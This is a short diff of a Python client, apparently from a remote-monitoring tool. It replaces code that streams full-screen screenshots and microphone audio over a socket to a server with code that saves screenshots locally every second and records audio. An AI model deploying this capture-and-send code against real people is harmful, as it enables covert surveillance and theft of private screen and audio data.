@@ -1,46 +1,29 @@
 import socket
 import time
 import pyautogui
-import pyaudio
-from lib import client, comm, config
+from lib import audio, client, config
 
 
 # =====================
-# Screen Capture Sender
+# Screen Capturer
 # =====================
 def video_shell(server: socket.socket):
     try:
+        count = 0
         while True:
-            image_bytes = pyautogui.screenshot().tobytes()  # Screenshot full screen
-            comm.sendall(server, image_bytes, config.CLIENT_VERBOSE)
-            time.sleep(3)  # reduce CPU usage
+            image = pyautogui.screenshot()  # Screenshot full screen
+            image.save(f"./{str(count % 60)}.png")
+            time.sleep(1)  # reduce CPU usage
+            count += 1
     except Exception as e:
         print("[VIDEO_CLIENT_ERROR]", e)
 
 
 # =====================
-# Microphone Audio Sender
+# Microphone Audio Recorder
 # =====================
 def audio_shell(server: socket.socket):
-    p = pyaudio.PyAudio()
-    stream = p.open(
-        format=pyaudio.paInt16,
-        channels=config.CHANNELS,
-        rate=config.RATE,
-        output=True,
-        frames_per_buffer=config.CHUNK,
-    )
-    try:
-        while True:
-            data = stream.read(1024)
-            comm.sendall(server, data, config.CLIENT_VERBOSE)
-            time.sleep(3)
-    except Exception as e:
-        print("[AUDIO_CLIENT_ERROR]", e)
-    finally:
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
+    audio.record(60)
 
 
 def connect_video_server():
